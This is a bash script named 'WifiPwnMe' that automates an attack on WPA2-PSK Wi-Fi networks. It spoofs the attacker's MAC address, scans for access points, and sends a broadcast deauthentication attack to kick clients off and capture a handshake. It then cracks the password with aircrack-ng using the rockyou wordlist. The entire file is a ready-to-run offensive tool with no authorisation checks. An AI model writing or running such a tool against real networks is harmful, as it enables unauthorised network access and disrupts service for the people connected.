#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Function CTRL+c

trap ctrl_c INT

function ctrl_c(){
    echo -ne "\n${redColour}[!]${endColour} ${grayColour}[+] Exiting...\n${endColour}"
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    echo -ne "${greenColour}\n Thanks for using the tool...\n${endColour}"
}
# Menu

function banner(){
   echo -ne "${greenColour}▌║█║▌│║▌│║▌║▌█║ WifiPwnMe WPA2-PSK ▌│║▌║▌│║║▌█║▌║█${endColour}\n"
   echo -ne "${greenColour}                  by MiguelRega7             ${endColour}\n"
}

function help_panel(){
  banner
  echo -e "\n${yellowColour}[+]${endColour}${grayColour} Use: ./WifiPwnMe.sh${endColour}"
  echo -e "\t${purpleColour}n)${endColour}${yellowColour} Name of your Network Card${endColour}"
  echo -e "\t${purpleColour}i)${endColour}${yellowColour} Install Dependencies${endColour}"
  echo -e "\t${purpleColour}h)${endColour}${yellowColour} Print help panel${endColour}\n"
  exit 0
}

function HackingWifi(){
  echo -e "${yellowColour}[+]${endColour}${grayColour} Changin your MAC Address and Configuring your network card...${endColour}\n"
  airmon-ng start $networkCard > /dev/null 2>&1
  ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
  echo -e "${yellowColour}[+]${endColour}${grayColour} Killing Unnecessary processes...${endColour}"
  ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
  echo -e "${yellowColour}[*]${endColour}${grayColour} New MAC Address ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
  sleep 1
  echo -e "${yellowColour}[+]${endColour}${grayColour} Showing available Wi-Fi networks ${endColour}"
  xterm -hold -e "airodump-ng ${networkCard}mon" &
  airodump_xterm_PID=$!
  echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read PointName
  echo -ne "\n${blueColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read Channel
  kill -9 $airodump_xterm_PID
  wait $airodump_xterm_PID 2>/dev/null
  xterm -hold -e "airodump-ng -c $Channel -w Captura --essid $PointName ${networkCard}mon" &
  airodump_filter_xterm_PID=$!
  echo -e "${yellowColour}[+]${endColour}${grayColour} Global Deauthentication Attack ${endColour}"

  sleep 10; xterm -hold -e "aireplay-ng -0 10 -e $PointName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
  aireplay_xterm_PID=$!
  sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

  sleep 10; kill -9 $airodump_filter_xterm_PID
  wait $airodump_filter_xterm_PID 2>/dev/null

  echo -e "${yellowColour}[+]${endColour}${grayColour} Getting the password ${endColour}"
  xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Captura-01.cap" &
}

# Installing Dependencies

function install_dependencies() {
  echo -e "${yellowColour}[+]${endColour}${grayColour} Installing Dependencies...${endColour}"
  apt-get install -y xterm
  echo -e "${greenColour}[+]${endColour}${grayColour} Dependencies installed successfully.${endColour}"
}

# Configuration

if [ "$(id -u)" == "0" ]; then
        declare -i parameter_counter=0; while getopts ":n:ih:" arg; do
                case $arg in
                        n) networkCard=$OPTARG; let parameter_counter+=1 ;;
                        i) install_dependencies; exit 0 ;;
                        h) help_panel;;
                esac
        done

        if [ $parameter_counter -lt 1 ]; then
		            help_panel
	      else
                HackingWifi
                tput cnorm; airmon-ng stop ${networkCard} > /dev/null 2>&1
        fi
else
        echo -e "\n${redColour}[+] You have to be root${endColour}\n"
fi
